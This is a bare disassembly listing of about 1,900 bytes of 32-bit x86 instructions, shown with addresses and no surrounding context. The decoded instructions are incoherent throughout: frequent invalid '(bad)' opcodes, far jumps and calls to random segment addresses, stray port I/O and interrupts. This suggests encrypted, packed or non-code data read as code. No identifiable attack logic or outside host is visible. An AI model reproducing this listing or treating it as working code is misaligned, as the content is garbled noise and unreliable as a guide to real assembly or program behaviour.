  40ec2c:	dec    ebx
  40ec2d:	imul   ecx,DWORD PTR [ebx-0x7],0x70
  40ec31:	loopne 0x40eca5
  40ec33:	iret   
  40ec34:	inc    ebp
  40ec35:	pop    edi
  40ec36:	or     DWORD PTR [esi+edi*4+0x2e35176d],esp
  40ec3d:	sub    esi,DWORD PTR [eax+0x2304f401]
  40ec43:	ins    DWORD PTR es:[edi],dx
  40ec44:	ds sub al,0x8e
  40ec47:	fwait
  40ec48:	xchg   esp,eax
  40ec49:	jne    0x40ec7e
  40ec4b:	imul   edx,DWORD PTR [ebx-0x52],0xcd322cb0
  40ec52:	mov    cl,0xf2
  40ec54:	mov    ecx,0x333d5d36
  40ec59:	xchg   dh,bl
  40ec5b:	adc    BYTE PTR [esi],dh
  40ec5d:	imul   ecx,DWORD PTR [ecx+ebp*2],0x6
  40ec61:	push   0x17
  40ec63:	call   0xa6849f52
  40ec68:	dec    ebx
  40ec69:	fisttp WORD PTR [esp+ecx*2]
  40ec6c:	lods   al,BYTE PTR ds:[esi]
  40ec6d:	xchg   BYTE PTR [edi+0x59],bl
  40ec70:	xchg   esi,eax
  40ec71:	mov    al,ds:0xbeade293
  40ec76:	leave  
  40ec77:	xchg   ecx,eax
  40ec78:	loop   0x40ec2d
  40ec7a:	jmp    0x2ad9:0x6dfc1e2
  40ec81:	inc    edx
  40ec82:	adc    eax,0x8f574d49
  40ec87:	sahf   
  40ec88:	jmp    0x3ba1:0x58522aaa
  40ec8f:	sub    eax,0x17916474
  40ec94:	jae    0x40ed05
  40ec96:	aaa    
  40ec97:	push   esi
  40ec98:	add    BYTE PTR [esi+0x6bef6e51],al
  40ec9e:	mov    WORD PTR [ecx-0x6225ed0f],ss
  40eca4:	in     eax,0x2a
  40eca6:	jle    0x40ec9c
  40eca8:	mov    eax,ds:0x962fceee
  40ecad:	mov    ecx,DWORD PTR [edi+eiz*1-0x380a480d]
  40ecb4:	sbb    ah,cl
  40ecb6:	call   0xfd3eb6ca
  40ecbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecbc:	data16 add bh,BYTE PTR [ecx+edi*8+0x54]
  40ecc1:	scas   al,BYTE PTR es:[edi]
  40ecc2:	jmp    0x4234c14c
  40ecc7:	call   0xc946:0x7bc10b29
  40ecce:	fcom   st(1)
  40ecd0:	aad    0xb7
  40ecd2:	or     eax,0xdeccb129
  40ecd7:	fmul   QWORD PTR [esi]
  40ecd9:	int3   
  40ecda:	outs   dx,DWORD PTR ds:[esi]
  40ecdb:	sub    cl,dh
  40ecdd:	mov    cl,0x7b
  40ecdf:	jnp    0x40ed55
  40ece1:	jbe    0x40ed11
  40ece3:	mov    eax,0x3463d6d6
  40ece8:	test   cl,bh
  40ecea:	sahf   
  40eceb:	(bad)  
  40eced:	popa   
  40ecee:	mov    ds:0x108b2149,eax
  40ecf3:	int    0xa8
  40ecf5:	xor    al,0x95
  40ecf7:	jmp    0x581a:0x1e59f7c5
  40ecfe:	push   ds
  40ecff:	arpl   WORD PTR [esi+0x3cd8bdbb],si
  40ed05:	inc    ecx
  40ed06:	fist   WORD PTR [esi-0x40934239]
  40ed0c:	and    al,0x18
  40ed0e:	mov    ch,0x28
  40ed10:	bound  ebp,QWORD PTR [edi+ebp*8-0x11]
  40ed14:	shl    DWORD PTR [eax+0x2e82fa2e],1
  40ed1a:	xchg   bp,ax
  40ed1c:	imul   esi,DWORD PTR [ecx+0x3c],0x29f8955
  40ed23:	push   esi
  40ed24:	shl    BYTE PTR ds:0x4f6d56ba,0xd7
  40ed2b:	sub    al,0x44
  40ed2d:	pusha  
  40ed2e:	ret    
  40ed2f:	ds int 0xe4
  40ed32:	or     al,0x76
  40ed34:	lock add cl,BYTE PTR [ebx]
  40ed37:	pusha  
  40ed38:	ds pop esp
  40ed3a:	in     al,dx
  40ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3c:	ror    BYTE PTR [edi+edx*8+0x28],cl
  40ed40:	add    BYTE PTR [ebp+ebx*1-0x79],0xd7
  40ed45:	sbb    edx,DWORD PTR [edi+0x25]
  40ed48:	out    0x3e,eax
  40ed4a:	dec    edx
  40ed4b:	push   esp
  40ed4c:	push   ss
  40ed4d:	fdivr  DWORD PTR [ebp-0x5a]
  40ed50:	mov    bl,0x91
  40ed52:	push   ds
  40ed53:	mov    esi,0xdc6a4a07
  40ed58:	call   0xd0d7:0x327a4198
  40ed5f:	pop    ss
  40ed60:	sbb    DWORD PTR [eax-0x7f],edi
  40ed63:	add    al,ch
  40ed65:	xor    esp,ecx
  40ed67:	ficom  DWORD PTR [ebx]
  40ed69:	cdq    
  40ed6a:	dec    edx
  40ed6b:	mov    esi,esi
  40ed6d:	fwait
  40ed6e:	cli    
  40ed6f:	scas   eax,DWORD PTR es:[edi]
  40ed70:	dec    edi
  40ed71:	(bad)  
  40ed72:	scas   al,BYTE PTR es:[edi]
  40ed73:	call   0x198f:0xb2156e08
  40ed7a:	pop    esp
  40ed7b:	pop    esi
  40ed7c:	xchg   ebx,eax
  40ed7d:	stc    
  40ed7e:	call   0xe3b4a506
  40ed83:	fwait
  40ed84:	pop    ss
  40ed85:	push   ds
  40ed86:	jno    0x40ed29
  40ed88:	add    eax,0x4a2f2a07
  40ed8d:	adc    eax,0xb356be7a
  40ed92:	shr    DWORD PTR [ecx],1
  40ed94:	sbb    ecx,ebp
  40ed96:	xchg   ecx,eax
  40ed97:	cli    
  40ed98:	jns    0x40ed7c
  40ed9a:	xchg   BYTE PTR [esi+0x43],ah
  40ed9d:	mov    bl,0xb0
  40ed9f:	stc    
  40eda0:	jo     0x40ed98
  40eda2:	in     al,0x4b
  40eda4:	pop    ebx
  40eda5:	push   cs
  40eda6:	rcl    DWORD PTR [ebx+0x27],0x86
  40edaa:	and    DWORD PTR ds:0x1e854f15,edi
  40edb0:	jl     0x40edd0
  40edb2:	(bad)  
  40edb3:	xchg   edx,eax
  40edb4:	or     BYTE PTR [edx],0x28
  40edb7:	sbb    BYTE PTR [ecx+0x4d],bl
  40edba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edbb:	idiv   BYTE PTR [edi]
  40edbd:	mov    BYTE PTR ds:0xd5e095c6,bh
  40edc3:	ja     0x40ed79
  40edc5:	dec    edi
  40edc6:	pop    esi
  40edc7:	and    edx,DWORD PTR [eax+0x6122c23c]
  40edcd:	sub    DWORD PTR [ebx-0x26],0x8334fcd4
  40edd4:	shl    BYTE PTR [edi],1
  40edd6:	popa   
  40edd7:	out    0xb7,eax
  40edd9:	aas    
  40edda:	sahf   
  40eddb:	stos   BYTE PTR es:[edi],al
  40eddc:	mov    esi,0x212419de
  40ede1:	out    dx,eax
  40ede2:	in     eax,dx
  40ede3:	scas   eax,DWORD PTR es:[edi]
  40ede4:	inc    esp
  40ede5:	int3   
  40ede6:	test   DWORD PTR [ebp-0x17],edi
  40ede9:	ds dec eax
  40edeb:	test   BYTE PTR [ecx+eiz*2],0x92
  40edef:	or     ebx,edi
  40edf1:	mov    bl,0x77
  40edf3:	xchg   esp,eax
  40edf4:	rcl    BYTE PTR [ebx],0x49
  40edf7:	xor    BYTE PTR [edi-0x182bc6f8],dl
  40edfd:	repnz imul eax,DWORD PTR [ebp-0x236d217],0xffffffb2
  40ee05:	stos   BYTE PTR es:[edi],al
  40ee06:	cli    
  40ee07:	int    0x3c
  40ee09:	add    ah,BYTE PTR [ebp-0x4d]
  40ee0c:	add    eax,0xcf92da63
  40ee11:	adc    cl,BYTE PTR [esi]
  40ee13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee14:	ins    BYTE PTR es:[edi],dx
  40ee15:	jnp    0x40edc6
  40ee17:	lea    edi,[eax-0x540830f6]
  40ee1d:	addr16 in al,dx
  40ee1f:	jno    0x40edc6
  40ee21:	ins    BYTE PTR es:[edi],dx
  40ee22:	loope  0x40edc6
  40ee24:	push   es
  40ee25:	push   eax
  40ee26:	sub    al,0x64
  40ee28:	mov    dl,0x26
  40ee2a:	loop   0x40ee52
  40ee2c:	(bad)  
  40ee2d:	outs   dx,DWORD PTR ds:[esi]
  40ee2e:	mov    dh,0x5c
  40ee30:	fadd   st,st(3)
  40ee32:	mov    WORD PTR [ecx-0x97b7e24],cs
  40ee38:	xchg   ecx,eax
  40ee39:	test   edx,ebp
  40ee3b:	jl     0x40ee09
  40ee3d:	mov    ds:0xb6b31e6f,al
  40ee42:	xor    ebp,esi
  40ee44:	out    dx,al
  40ee45:	dec    edi
  40ee46:	jmp    0x40eec6
  40ee48:	in     al,0x4c
  40ee4a:	xchg   DWORD PTR [edi],edi
  40ee4c:	je     0x40ee96
  40ee4e:	test   BYTE PTR [edx],bh
  40ee50:	sti    
  40ee51:	push   edi
  40ee52:	adc    eax,0xee4d4775
  40ee57:	in     eax,0x15
  40ee59:	inc    esi
  40ee5a:	sub    eax,0x99b5e4b3
  40ee5f:	aad    0xa7
  40ee61:	into   
  40ee62:	sub    BYTE PTR [esi-0x19],cl
  40ee65:	jne    0x40eec0
  40ee67:	outs   dx,BYTE PTR es:[esi]
  40ee69:	sar    edi,0xa
  40ee6c:	ret    0x4314
  40ee6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee70:	inc    edi
  40ee71:	pop    ds
  40ee72:	hlt    
  40ee73:	add    BYTE PTR [edx+0x12],dh
  40ee76:	dec    edi
  40ee77:	pusha  
  40ee78:	mov    edx,0x1ad4487a
  40ee7d:	jnp    0x40eeee
  40ee7f:	retf   
  40ee80:	pop    ss
  40ee81:	or     al,0xe
  40ee83:	or     DWORD PTR [eax],esp
  40ee85:	fucomi st,st(7)
  40ee87:	xchg   esi,eax
  40ee88:	push   cs
  40ee89:	out    0x69,al
  40ee8b:	scas   eax,DWORD PTR es:[edi]
  40ee8c:	add    DWORD PTR [eax],esp
  40ee8e:	imul   ecx,DWORD PTR [edx+ecx*8],0x2f5de490
  40ee95:	fldcw  WORD PTR [edx-0x1571469c]
  40ee9b:	stos   BYTE PTR es:[edi],al
  40ee9c:	cdq    
  40ee9d:	out    0xef,eax
  40ee9f:	jbe    0x40ee98
  40eea1:	sub    ah,BYTE PTR [ebx-0x28319215]
  40eea7:	sub    BYTE PTR gs:[edi+edx*8+0x2e23572a],cl
  40eeaf:	test   DWORD PTR [eax],0xc5491da9
  40eeb5:	cld    
  40eeb6:	(bad)  
  40eeb7:	xchg   edx,eax
  40eeb8:	sar    DWORD PTR es:[edi+0x1a117966],cl
  40eebf:	call   0xf0bf3815
  40eec4:	mov    DWORD PTR [ecx-0x2c],esp
  40eec7:	mov    ah,dl
  40eec9:	pop    es
  40eeca:	(bad)  
  40eecb:	repz scas al,BYTE PTR es:[edi]
  40eecd:	sbb    edi,edx
  40eecf:	stos   DWORD PTR es:[edi],eax
  40eed0:	mov    edi,0x305cd57f
  40eed5:	dec    edi
  40eed6:	sub    dl,BYTE PTR [esi+0x7d]
  40eed9:	mov    ah,0xc0
  40eedb:	dec    esp
  40eedc:	add    eax,0x61313efa
  40eee1:	jmp    DWORD PTR [ebx]
  40eee3:	rep lods al,BYTE PTR ds:[esi]
  40eee5:	adc    ch,BYTE PTR [eax]
  40eee7:	jle    0x40eef0
  40eee9:	ss nop
  40eeeb:	fidiv  DWORD PTR [edx+esi*4+0xdb25eed]
  40eef2:	stos   BYTE PTR es:[edi],al
  40eef3:	test   al,0xfe
  40eef5:	imul   BYTE PTR [ebp-0x5a]
  40eef8:	pushf  
  40eef9:	das    
  40eefa:	test   eax,0x3b6f7982
  40eeff:	test   DWORD PTR [ebx-0x2922e265],esp
  40ef05:	je     0x42ed39c3
  40ef0b:	mov    esi,0x4b8998c6
  40ef10:	sbb    eax,0x6c9c9d51
  40ef15:	push   esp
  40ef16:	and    eax,0xf36964dd
  40ef1b:	ret    0x9d70
  40ef1e:	and    ch,bh
  40ef20:	pusha  
  40ef21:	test   DWORD PTR [edi+edx*8+0x7f],esp
  40ef25:	lods   eax,DWORD PTR ds:[esi]
  40ef26:	ret    0x5eee
  40ef29:	and    eax,0xad220060
  40ef2e:	mov    eax,edx
  40ef30:	sahf   
  40ef31:	mov    edx,0xc8880e1
  40ef36:	fincstp 
  40ef38:	lahf   
  40ef39:	xor    DWORD PTR [edx-0x6],edi
  40ef3c:	sub    DWORD PTR [ebx],ecx
  40ef3e:	arpl   WORD PTR [eax+0x297891fa],si
  40ef44:	cmp    DWORD PTR [ebx],esp
  40ef46:	daa    
  40ef47:	sgdtd  ds:[esi+0x7ca9cb1e]
  40ef4f:	fdivr  DWORD PTR [ebx-0x66]
  40ef52:	int    0xff
  40ef54:	sub    eax,0x559ff1a0
  40ef59:	or     al,0xbb
  40ef5b:	mov    ebx,edi
  40ef5d:	xchg   ecx,eax
  40ef5e:	pusha  
  40ef5f:	cmp    BYTE PTR [ebp+0x5660e5cd],al
  40ef65:	inc    ebp
  40ef66:	addr16 pop ecx
  40ef68:	fwait
  40ef69:	pop    esp
  40ef6a:	cdq    
  40ef6b:	mov    bl,0x36
  40ef6d:	jbe    0x40ef99
  40ef6f:	jne    0x40efed
  40ef71:	sahf   
  40ef72:	scas   eax,DWORD PTR es:[edi]
  40ef73:	lds    edx,FWORD PTR [edx-0x6b8ddf9e]
  40ef79:	pop    edi
  40ef7a:	mov    ebx,0xf64d0256
  40ef7f:	dec    edx
  40ef80:	adc    eax,0xf3d86723
  40ef85:	repnz in eax,0x77
  40ef88:	lsl    edi,WORD PTR [edi+0x545ac982]
  40ef8f:	bound  ebx,QWORD PTR [edx]
  40ef91:	xlat   BYTE PTR ds:[ebx]
  40ef92:	xor    eax,0x9f6f8960
  40ef97:	into   
  40ef98:	rol    DWORD PTR [esi+0x3129271],cl
  40ef9e:	aaa    
  40ef9f:	inc    BYTE PTR [ebx-0x197bf832]
  40efa5:	fidivr WORD PTR [edx+0x61b097c6]
  40efab:	jecxz  0x40efb1
  40efad:	add    ch,BYTE PTR [esp+edx*2+0x65]
  40efb1:	fsubr  st,st(2)
  40efb3:	cmp    DWORD PTR [ebx-0x2b],ebp
  40efb6:	mov    al,0x3a
  40efb8:	mov    esp,0xd582d8f
  40efbd:	adc    esi,ebp
  40efbf:	pop    eax
  40efc0:	imul   ebx,eax,0x40
  40efc3:	lods   al,BYTE PTR ds:[esi]
  40efc4:	pusha  
  40efc5:	mov    ah,0x70
  40efc7:	js     0x40efa3
  40efc9:	retf   0x8092
  40efcc:	popf   
  40efcd:	cmp    eax,0xe8c73dbd
  40efd2:	sub    eax,0x503cfb21
  40efd7:	mov    eax,ds:0x81403e8b
  40efdc:	push   ecx
  40efdd:	iret   
  40efde:	mov    ds:0xc45a7382,al
  40efe3:	imul   esp,DWORD PTR [ecx+0xe],0xffffffea
  40efe7:	call   0x8ebc:0x329b9ce9
  40efee:	push   edx
  40efef:	cmp    eax,0x4e9d5d81
  40eff4:	ins    BYTE PTR es:[edi],dx
  40eff5:	adc    al,0x29
  40eff7:	repz mov al,0x15
  40effa:	mov    eax,ds:0x3b193413
  40efff:	sub    eax,DWORD PTR [ecx+0x2150014b]
  40f005:	mov    ecx,ds
  40f007:	xor    al,BYTE PTR [eax+eiz*4+0x51]
  40f00b:	popa   
  40f00c:	xor    ch,BYTE PTR [edx]
  40f00e:	fwait
  40f00f:	add    DWORD PTR [ebx+0x3b],0xffffffc5
  40f013:	stc    
  40f014:	test   BYTE PTR [edx],dh
  40f016:	iret   
  40f017:	js     0x40f03e
  40f019:	stos   BYTE PTR es:[edi],al
  40f01a:	mov    cl,ah
  40f01c:	mov    WORD PTR [esi+0x5deee413],fs
  40f022:	pop    ss
  40f023:	cmp    bl,bh
  40f025:	sub    BYTE PTR [ecx-0xb461c83],bh
  40f02b:	(bad)  
  40f02c:	jmp    0x2e4d285c
  40f031:	jns    0x40eff5
  40f033:	scas   eax,DWORD PTR es:[edi]
  40f034:	sbb    BYTE PTR [edx],0xe
  40f037:	test   eax,0xa586313b
  40f03c:	aam    0xbb
  40f03e:	test   BYTE PTR [ebx+eax*8+0x27],al
  40f042:	mov    edi,0xc16ea48c
  40f047:	(bad)  
  40f048:	hlt    
  40f049:	push   0x57
  40f04b:	out    dx,eax
  40f04c:	pop    ds
  40f04d:	test   al,0xe0
  40f04f:	mov    esp,0x9e9ddb44
  40f054:	dec    ebp
  40f055:	cdq    
  40f056:	stos   DWORD PTR es:[edi],eax
  40f057:	or     DWORD PTR ss:[ecx+0x536990b3],edx
  40f05e:	aam    0xc4
  40f060:	stos   DWORD PTR es:[edi],eax
  40f061:	lods   al,BYTE PTR ds:[esi]
  40f062:	or     BYTE PTR [edx-0x6daab0a],cl
  40f068:	ret    0xcce5
  40f06b:	mov    edi,0x5f9b16e5
  40f070:	lods   eax,DWORD PTR ds:[esi]
  40f071:	xor    al,0x29
  40f073:	push   ebx
  40f074:	(bad)  
  40f075:	jmp    DWORD PTR [eax+0x416a89fb]
  40f07b:	xor    dh,bl
  40f07d:	inc    ecx
  40f07e:	push   ss
  40f07f:	jmp    0x174bca6b
  40f084:	mov    esp,0x95466894
  40f089:	xchg   esp,eax
  40f08a:	test   eax,0xa0135199
  40f08f:	xor    edx,ebx
  40f091:	imul   ebx,DWORD PTR [ebx-0x63],0xf44a1964
  40f098:	jg     0x40f066
  40f09a:	into   
  40f09b:	and    al,0xd9
  40f09d:	loopne 0x40f0f4
  40f09f:	adc    al,0x31
  40f0a1:	dec    ecx
  40f0a2:	dec    edx
  40f0a3:	fist   DWORD PTR ds:0x894fb26c
  40f0a9:	xchg   DWORD PTR [edx],esi
  40f0ab:	test   DWORD PTR [esi-0x73e9ce24],ebp
  40f0b1:	or     al,0x13
  40f0b3:	push   ecx
  40f0b4:	leave  
  40f0b5:	inc    ebp
  40f0b6:	adc    al,bh
  40f0b8:	lock fidiv DWORD PTR [edi]
  40f0bb:	xor    esi,esi
  40f0bd:	fs xchg edi,eax
  40f0bf:	clc    
  40f0c0:	enter  0x9cfa,0xde
  40f0c4:	mov    esp,0xcc99196a
  40f0c9:	mov    edx,DWORD PTR [ebx+0x502dd101]
  40f0cf:	sub    BYTE PTR [ebx],0x4c
  40f0d2:	sbb    eax,0xfe4a61dc
  40f0d7:	in     eax,dx
  40f0d8:	pop    edx
  40f0d9:	ins    BYTE PTR es:[edi],dx
  40f0da:	adc    BYTE PTR [ebx-0x33bfb7d6],bh
  40f0e0:	ins    DWORD PTR es:[edi],dx
  40f0e1:	push   edi
  40f0e2:	sub    al,0xc0
  40f0e4:	mov    BYTE PTR [ebx],bl
  40f0e6:	pop    es
  40f0e7:	dec    ecx
  40f0e8:	push   ss
  40f0e9:	cmp    DWORD PTR [ebp-0x4],esi
  40f0ec:	add    BYTE PTR [edi],0xb5
  40f0ef:	mov    bl,0x51
  40f0f1:	sbb    edi,DWORD PTR [ebx]
  40f0f3:	mov    ch,0xdf
  40f0f5:	data16 fstp QWORD PTR [ebp-0x6f]
  40f0f9:	push   ecx
  40f0fa:	sahf   
  40f0fb:	inc    esi
  40f0fc:	cmp    DWORD PTR [edi+0x7399d776],0x4c
  40f103:	das    
  40f104:	mov    esp,0x7153dcbf
  40f109:	xchg   ebp,eax
  40f10a:	push   ds
  40f10b:	call   0xfd89183
  40f110:	mov    bh,0x3f
  40f112:	test   al,0xd5
  40f114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f115:	jbe    0x40f0b8
  40f117:	cs inc ebx
  40f119:	jo     0x40f15c
  40f11b:	dec    ecx
  40f11c:	scas   eax,DWORD PTR es:[edi]
  40f11d:	xor    ecx,edx
  40f11f:	(bad)  
  40f120:	aam    0x33
  40f122:	jl     0x40f0be
  40f124:	stos   BYTE PTR es:[edi],al
  40f125:	fcmovb st,st(2)
  40f127:	sub    dh,BYTE PTR [esi]
  40f129:	mov    ah,0x7e
  40f12b:	cs jle 0x40f0b7
  40f12e:	pop    edi
  40f12f:	gs or  al,0xf8
  40f132:	adc    al,bl
  40f134:	push   esp
  40f135:	mov    ah,ah
  40f137:	jle    0x40f13f
  40f139:	sub    esi,0x87d3a401
  40f13f:	les    ebp,FWORD PTR [edx-0x7269f53e]
  40f145:	fistp  QWORD PTR [edi+0x3e1a52b8]
  40f14b:	mov    ch,bl
  40f14d:	jbe    0x40f157
  40f14f:	mov    ah,ah
  40f151:	out    dx,eax
  40f152:	int    0x42
  40f154:	outs   dx,BYTE PTR ds:[esi]
  40f155:	cmp    BYTE PTR [ebp-0x19],bh
  40f158:	cmp    esi,edi
  40f15a:	push   ebx
  40f15b:	jne    0x40f0e3
  40f15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f15e:	push   ds
  40f15f:	xor    eax,DWORD PTR [ebp-0x1f]
  40f162:	lods   eax,DWORD PTR ds:[esi]
  40f163:	sub    edi,0x1b651f49
  40f169:	mov    ax,ds:0x15c07ce6
  40f16f:	dec    eax
  40f170:	int3   
  40f171:	mov    DWORD PTR [ecx+edi*2-0x5b8cf51e],esi
  40f178:	out    dx,al
  40f179:	sbb    DWORD PTR [edx+0x39],edi
  40f17c:	stos   BYTE PTR es:[edi],al
  40f17d:	in     al,dx
  40f17e:	repz ficomp DWORD PTR [ebx+0x32]
  40f182:	dec    eax
  40f183:	int    0x6c
  40f185:	sub    al,0x91
  40f187:	and    al,0x67
  40f189:	adc    esi,ebx
  40f18b:	or     BYTE PTR [eax+esi*8-0x2220bf5],al
  40f192:	in     eax,dx
  40f193:	inc    ebx
  40f194:	fbld   TBYTE PTR [ebp-0x41]
  40f197:	jmp    0x27bb:0xaf2e043b
  40f19e:	lahf   
  40f19f:	jl     0x40f1cc
  40f1a1:	jle    0x40f179
  40f1a3:	adc    BYTE PTR [edx-0xe],0x31
  40f1a7:	fwait
  40f1a8:	dec    edi
  40f1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1aa:	cmp    ebp,eax
  40f1ac:	mov    ecx,tr3
  40f1af:	xchg   ebx,eax
  40f1b0:	fwait
  40f1b1:	sub    ebx,edi
  40f1b3:	mov    ch,0x2c
  40f1b5:	and    DWORD PTR [edx-0xf],esi
  40f1b8:	sbb    eax,0xcc31670e
  40f1bd:	fnstcw WORD PTR [ecx+0x4d62097e]
  40f1c3:	scas   eax,DWORD PTR es:[edi]
  40f1c4:	cmp    BYTE PTR [eax-0x44],ch
  40f1c7:	jmp    0xf344:0x5fe3255d
  40f1ce:	jmp    0xbae3:0xc36f6580
  40f1d5:	push   edi
  40f1d6:	mov    BYTE PTR [eax-0x27],al
  40f1d9:	push   ebp
  40f1da:	cmp    eax,0x155df773
  40f1df:	mov    eax,ds:0x1be91d51
  40f1e4:	xor    al,0x4c
  40f1e6:	mov    bh,0x3f
  40f1e8:	test   DWORD PTR [eax-0x7a045371],esp
  40f1ee:	mov    dl,0xf6
  40f1f0:	fs cs mov ah,cl
  40f1f4:	daa    
  40f1f5:	icebp  
  40f1f6:	je     0x40f251
  40f1f8:	into   
  40f1f9:	add    ebx,edi
  40f1fb:	lahf   
  40f1fc:	lock out dx,eax
  40f1fe:	pop    ebp
  40f1ff:	ror    esp,1
  40f201:	lea    edx,[ecx-0x17]
  40f204:	repnz or al,0x8c
  40f207:	test   eax,0x21e2eb2a
  40f20c:	int    0x3f
  40f20e:	scas   eax,DWORD PTR es:[edi]
  40f20f:	mov    ds:0xa782a204,al
  40f214:	dec    edi
  40f215:	cmp    eax,0x32871f02
  40f21a:	lea    esi,[edi-0x7c]
  40f21d:	cdq    
  40f21e:	stos   DWORD PTR es:[edi],eax
  40f21f:	stos   DWORD PTR es:[edi],eax
  40f220:	adc    eax,0xd50e411d
  40f225:	test   edx,eax
  40f227:	push   esi
  40f228:	cld    
  40f229:	iret   
  40f22a:	mov    edi,edi
  40f22c:	fwait
  40f22d:	sbb    al,0x13
  40f22f:	out    dx,al
  40f230:	sub    edi,ebp
  40f232:	lock shr BYTE PTR [edx+eiz*4-0x74],cl
  40f237:	imul   edi,DWORD PTR [esi],0x2ec8e2a0
  40f23d:	pushw  ds
  40f23f:	xchg   BYTE PTR [edi+eiz*2-0x4f11af05],al
  40f246:	(bad)  
  40f247:	jl     0x40f292
  40f249:	and    esp,DWORD PTR [edx+ecx*4-0x4]
  40f24d:	mov    esi,DWORD PTR [esp+ebp*2-0x1b]
  40f251:	cdq    
  40f252:	shr    DWORD PTR [eax-0x295cf7c9],cl
  40f258:	mov    di,0x16e2
  40f25c:	sahf   
  40f25d:	call   0xf18a:0x1717da87
  40f264:	xlat   BYTE PTR ds:[ebx]
  40f265:	push   0x68e48f6e
  40f26a:	jg     0x40f215
  40f26c:	jno    0x40f2d9
  40f26e:	xor    eax,0xb20693c
  40f273:	pop    es
  40f274:	jmp    0x93e3:0xcb594690
  40f27b:	dec    ebx
  40f27c:	inc    eax
  40f27d:	popf   
  40f27e:	jg     0x40f2d6
  40f280:	or     BYTE PTR [esi],bh
  40f282:	inc    ebx
  40f283:	add    al,0xf8
  40f285:	inc    ebp
  40f286:	inc    edx
  40f287:	popa   
  40f288:	in     al,dx
  40f289:	xor    al,0xc5
  40f28b:	enter  0x9f92,0x9d
  40f28f:	mov    cl,0x49
  40f291:	sbb    eax,0x8796b6ec
  40f296:	adc    DWORD PTR [eax],edi
  40f298:	out    dx,al
  40f299:	(bad)  [esi+0x6117a884]
  40f29f:	pusha  
  40f2a0:	mov    bl,0xa0
  40f2a2:	push   0x96aa085a
  40f2a7:	pop    ebp
  40f2a8:	adc    BYTE PTR [esi+0x48],cl
  40f2ab:	jmp    0xf408:0xf475e9e1
  40f2b2:	cwde   
  40f2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2b5:	pop    edx
  40f2b6:	test   ebp,ecx
  40f2b8:	push   es
  40f2b9:	push   edi
  40f2ba:	xchg   edi,eax
  40f2bb:	jle    0x40f26a
  40f2bd:	jo     0x40f2b2
  40f2bf:	aad    0x69
  40f2c1:	shl    DWORD PTR [ebx-0x4340828d],0x58
  40f2c8:	loope  0x40f299
  40f2ca:	jge    0x40f2b1
  40f2cc:	cli    
  40f2cd:	mov    al,0x3e
  40f2cf:	dec    edx
  40f2d0:	push   0x77
  40f2d2:	cmp    al,0x66
  40f2d4:	loop   0x40f30b
  40f2d6:	mov    edi,0x2f1b140a
  40f2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2dc:	adc    ch,al
  40f2de:	or     edx,DWORD PTR [ecx+0x67]
  40f2e1:	mov    BYTE PTR [ebx+ebp*8],cl
  40f2e4:	xor    al,0x66
  40f2e6:	fist   DWORD PTR [eax+0x26]
  40f2e9:	addr16 ret 0xd9be
  40f2ed:	pusha  
  40f2ee:	stos   DWORD PTR es:[edi],eax
  40f2ef:	pop    esp
  40f2f0:	loope  0x40f2d9
  40f2f2:	adc    DWORD PTR [ebp+0x350fb262],eax
  40f2f8:	ds hlt 
  40f2fa:	(bad)  
  40f2fb:	mov    ebp,0xbb024c3a
  40f300:	xor    ebx,0xffffff8c
  40f303:	xor    al,BYTE PTR [edx]
  40f305:	scas   al,BYTE PTR es:[edi]
  40f306:	dec    edx
  40f307:	enter  0x57f6,0xae
  40f30b:	ret    0x57c
  40f30e:	pop    edi
  40f30f:	inc    eax
  40f310:	out    0x3d,al
  40f312:	mov    ds:0x654a3d2b,eax
  40f317:	dec    ebx
  40f318:	aad    0x9e
  40f31a:	mov    bl,0xb4
  40f31c:	sti    
  40f31d:	xchg   edx,eax
  40f31e:	call   0xa1ea:0x53f4236a
  40f325:	dec    ecx
  40f326:	xor    eax,0xa1dc48ab
  40f32b:	sub    edx,DWORD PTR [edi+0x5b]
  40f32e:	pop    ds
  40f32f:	adc    BYTE PTR [esi+0x5b061a55],ah
  40f335:	jae    0x40f301
  40f337:	jmp    0x4fde:0x38a1dfaa
  40f33e:	and    esp,DWORD PTR [ecx+0x37]
  40f341:	repz sar BYTE PTR [eax+edx*8],1
  40f345:	add    DWORD PTR [edx],eax
  40f347:	jmp    0x40f392
  40f349:	sbb    BYTE PTR [eax],bh
  40f34b:	jge    0x40f2ea
  40f34d:	add    DWORD PTR [ecx+0x46],0x919d910
  40f354:	jmp    DWORD PTR [esi+0x39c2ab1b]
  40f35a:	sbb    eax,0x8385598b
  40f35f:	mov    cl,0x38
  40f361:	rcl    edx,0x88
  40f364:	pop    edx
  40f365:	hlt    
  40f366:	jecxz  0x40f385
  40f368:	push   ecx
  40f369:	dec    edi
  40f36a:	xchg   esi,eax
  40f36b:	je     0x40f39c
  40f36d:	inc    ecx
  40f36e:	add    BYTE PTR [ebx],bh
  40f370:	rcl    ch,0x20
  40f373:	xor    eax,0x540b2cdf
  40f378:	iret   
  40f379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f37a:	sti    
  40f37b:	rol    BYTE PTR [esi],cl
  40f37d:	test   eax,0x878aeeaf
  40f382:	mov    BYTE PTR [esi+0x9],dl
  40f385:	and    al,0x40
  40f387:	adc    ax,0x9ce
  40f38b:	call   FWORD PTR [esi]
  40f38d:	cmp    ebx,ebx
  40f38f:	cmp    eax,0x3b8a2c60
  40f394:	jmp    0x40f333
  40f396:	mov    eax,0x9dcf8855
  40f39b:	fimul  WORD PTR [edi-0x29]
  40f39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f39f:	xchg   esp,eax
  40f3a0:	cdq    
  40f3a1:	in     eax,dx
  40f3a2:	retf   
  40f3a3:	std    
  40f3a4:	shl    BYTE PTR [ebp-0x20b2129b],cl
  40f3aa:	add    dh,bh
  40f3ac:	adc    dl,0x52
  40f3af:	scas   eax,DWORD PTR es:[edi]
  40f3b0:	mov    DWORD PTR [eax],ebx
  40f3b2:	add    ah,0x8b
  40f3b5:	mov    edi,0xf3fb253f
